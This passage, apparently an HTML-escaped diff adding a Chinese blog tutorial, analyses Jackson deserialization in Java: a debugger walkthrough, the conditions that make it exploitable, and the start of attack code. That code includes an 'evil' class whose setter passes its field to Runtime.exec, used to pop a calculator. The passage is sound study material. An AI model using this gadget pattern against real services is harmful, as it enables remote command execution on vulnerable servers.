+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Person person = new Person();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.age = 20;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.sex = new MySex();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  mapper.enableDefaultTyping();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//  String json = mapper.writeValueAsString(person);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//  System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    String json = &amp;#34;{\&amp;#34;age\&amp;#34;:20,\&amp;#34;name\&amp;#34;:\&amp;#34;ygsr\&amp;#34;,\&amp;#34;object\&amp;#34;:null,\&amp;#34;sex\&amp;#34;:[\&amp;#34;OBJECT_AND_NON_CONCRETE.MySex\&amp;#34;,{\&amp;#34;sex\&amp;#34;:0}]}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Person person1 = mapper.readValue(json, Person.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  System.out.println(person1);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521308903-6e4beda5-6c8d-4be0-a908-d065d024a076.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;调用了构造方法和set方法&lt;/p&gt;
+&lt;h3 id=&#34;使用-jsontypeinfo-注解&#34;&gt;使用 @JsonTypeInfo 注解
+&lt;/h3&gt;&lt;p&gt;Person类加上注解&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521381465-bcb98993-d2c8-443b-8ca2-6600c57b8294.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;结果和上面使用&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;DefaultTyping 一样&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521410100-1a538f28-b030-430d-8731-169c6f7811cb.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;jackson-反序列化调试分析&#34;&gt;Jackson 反序列化调试分析
+&lt;/h3&gt;&lt;p&gt;打上断点后调试&lt;/p&gt;
+&lt;p&gt;先进行JsonToken初始化&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522336918-60e7d3ae-86d1-4440-87ad-0e2456846dd1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;跳到&lt;code&gt;ObjectMapper&lt;/code&gt;,进行反序列化&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522510798-83b0d60a-12b4-4b41-bc76-83bd0dc7e849.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入后到&lt;code&gt;BeanDeserializer&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522553118-0d1d0234-c01d-475c-81ff-f1b4f01b1339.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入后跳到&lt;code&gt;vanillaDeserialize&lt;/code&gt;方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522639390-d80c8536-f1e1-4de3-b06e-6c4a26272fc0.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;跟进到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522942606-6b31f24f-1d06-48a0-ad24-13e309f85ce1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522967470-721a9781-4946-4a50-8deb-146533057e6c.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里判断&lt;code&gt;JsonToken&lt;/code&gt;是否为空&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523086447-a0a598e8-b323-4e35-a2c3-b38801fdebfd.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; 一直跟下去&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523228539-0dfb70a8-b472-4633-b9bf-18203a6d24d3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523366153-2817295e-d89e-4789-8377-195ccfb69c97.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523397062-8ad64717-89a8-4d61-9b32-8fc04b8a4622.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;前面应该对每个属性进行逐一反序列化调用每个属性的setter方法赋值,这里轮到了sex属性,跟进&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523412296-9ca18b82-3984-47e7-aff4-1e838b9f2763.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523524604-4f5bba12-bda1-44f9-964a-d69da42a9f69.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里就进到Mysex的setter方法去了,其实一开始应该是到call方法去,从而进到Mysex的构造方法里&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523942301-4e4357ce-bded-4f46-ac31-7d909e5e3e28.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;call:119, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;createUsingDefault:243, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vanillaDeserialize:249, BeanDeserializer (com.fasterxml.jackson.databind.deser)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;main:19, Test (OBJECT_AND_NON_CONCRETE)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;结论&#34;&gt;结论
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在 Jackson 反序列化中，若调用了 &lt;strong&gt;&lt;code&gt;**enableDefaultTyping()**&lt;/code&gt;&lt;/strong&gt; 函数或使用 &lt;strong&gt;&lt;code&gt;**@JsonTypeInfo**&lt;/code&gt;&lt;/strong&gt; 注解指定反序列化得到的类的属性为 &lt;strong&gt;&lt;code&gt;**JsonTypeInfo.Id.CLASS**&lt;/code&gt;&lt;/strong&gt; 或 &lt;strong&gt;&lt;code&gt;**JsonTypeInfo.Id.MINIMAL_CLASS**&lt;/code&gt;&lt;/strong&gt;，则会调用该属性的类的构造函数和 setter 方法。&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;jackson-反序列化漏洞&#34;&gt;Jackson 反序列化漏洞
+&lt;/h2&gt;&lt;h3 id=&#34;前提条件&#34;&gt;前提条件
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;满足下面三个条件之一即存在Jackson反序列化漏洞：&lt;/font&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;调用了 &lt;code&gt;ObjectMapper.enableDefaultTyping()&lt;/code&gt; 函数；&lt;/li&gt;
+&lt;li&gt;对要进行反序列化的类的属性使用了值为 &lt;code&gt;JsonTypeInfo.Id.CLASS&lt;/code&gt; 的 &lt;code&gt;@JsonTypeInfo&lt;/code&gt; 注解；&lt;/li&gt;
+&lt;li&gt;对要进行反序列化的类的属性使用了值为 &lt;code&gt;JsonTypeInfo.Id.MINIMAL_CLASS&lt;/code&gt; 的 &lt;code&gt;@JsonTypeInfo&lt;/code&gt; 注解；&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞场景&#34;&gt;漏洞场景
+&lt;/h3&gt;&lt;h4 id=&#34;属性不为object类时&#34;&gt;属性不为Object类时
+&lt;/h4&gt;&lt;p&gt;给MySex的setter方法里加入恶意代码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734524308342-2ca7cec0-2a85-4249-8367-a72fbdabe8b0.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;反序列化完后弹计算器&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734524353562-3df34534-a44c-46dd-ab86-7101a728c07b.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;一般来说这都是程序员才能修改源码,谁家好人会放后门在自己的源码里&lt;/p&gt;
+&lt;h4 id=&#34;属性为-object-类时&#34;&gt;属性为 Object 类时
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class evil {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String cmd;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public evil() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String getCmd() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return cmd;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void setCmd(String cmd) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.cmd = cmd;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        try
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Runtime.getRuntime().exec(this.cmd);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }catch (Exception e)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            e.printStackTrace();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import com.fasterxml.jackson.annotation.JsonTypeInfo;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class EvilPerson {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public int age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public Object object;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public EvilPerson() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public int getAge() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void setAge(int age) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.age = age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String getName() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void setName(String name) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.name = name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public Object getObject() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return object;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void setObject(Object object) {
